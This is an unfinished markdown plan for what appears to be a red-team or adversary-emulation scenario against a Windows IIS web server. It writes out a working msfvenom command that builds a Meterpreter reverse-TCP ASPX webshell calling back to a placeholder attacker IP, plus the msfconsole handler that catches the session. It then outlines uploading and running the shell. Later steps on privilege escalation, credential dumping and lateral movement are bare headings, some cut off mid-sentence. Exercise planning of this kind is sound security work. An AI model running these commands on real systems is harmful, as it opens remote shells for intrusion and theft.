# Scenario 1

## I. Preface

## II. Contents

### Step 0 - Setup

#### 0.A - Craft payload

On the `Attack Platform`:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f aspx > /tmp/modules/session.aspx
```

#### 0.B - Start listening for connection
On the `Attack Platform`:
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <attacker_ip>;set lport 4444;run'
```

### Step 1 - Initial Access

The scenario begins when attacker successfully upload a reverse webshell `session.aspx` to the target's webserver. <br>
After opening the webshell, `Attack Platform` receives a connection from `IIS server`.

#### 1.A - Upload reverse shell
#### 1.B - Execute reverse shell

### Step 2  - Privilege Escalation

The attacker exploit `IIS server` 

### Step  - Domain Discovery and Credential Dumping
### Step  - Lateral Movement

## III. Cited Intelligence
